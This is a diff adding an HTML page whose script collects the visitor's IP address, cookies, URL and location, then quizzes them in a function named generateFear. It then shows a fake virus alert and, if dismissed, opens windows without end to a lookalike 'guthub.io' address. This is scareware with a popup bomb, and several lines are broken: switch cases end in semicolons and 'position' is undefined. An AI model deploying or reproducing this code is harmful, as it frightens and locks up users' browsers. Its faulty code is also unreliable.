@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><body><script>
+async function getIPaddress(file) {
+  let IPAfile = await fetch(file);
+  let IPA = await IPAfile.text();
+  localStorage.setItem("IPaddress", IPA);
+}
+  getIPaddress("https://api64.ipify.org?format=json");
+function getCookies() {
+  localStorage.setItem("Cookies", document.cookie);
+}
+  getCookies();
+function getURL() {
+  localStorage.setItem("URL", location.href);
+}
+  getURL();
+function getGeolocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    localStorage.setItem("Coordinates", position.coords.latitude + "Latitude," + position.coords.longitude + "Longitude");
+  }
+}
+  getGeolocation();
+function generateFear() {
+  var saidIPaddress = prompt("What Is Your IP Address?");
+  switch(saidIPaddress) {
+    case localStorage.getItem("IPaddress");
+      alert("Correct!");
+      break;
+    default:
+      alert("No, Its " + localStorage.getItem("IPaddress"));
+  }
+  var saidURL = prompt("What Is The URL Of This Web Page?");
+  switch(saidURL) {
+    case localStorage.getItem("URL");
+      alert("Correct!");
+      break;
+    default:
+      alert("No, Its " + localStorage.getItem("URL"));
+  }
+  var saidCookies = prompt("What Are Your Current Cookies On This Website?");
+  switch(saidCookies) {
+    case localStorage.getItem("Cookies");
+      alert("Correct!");
+      break;
+    default:
+      alert("No, Its " + localStorage.getItem("Cookies"));
+  }
+  if (navigator.geolocation) {
+    var saidCoordinates = prompt("What Are Your Current Geological Coordinates?");
+    switch(saidCoordinates) {
+      case localStorage.getItem("Coordinates");
+        alert("Correct!");
+        break;
+      default:
+        alert("No, They Are " + localStorage.getItem("Coordinates"));
+    }
+  }
+}
+  generateFear();
+function blockSite() {
+  location.replace("javascript:if (confirm('[leathel]virusDetected!')) {alert('Virus Succesfully Ejected!');} else {while (true) {open('https://0038509gd.guthub.io/Virus');}}");
+}
+  blockSite();
+</script></body></html>
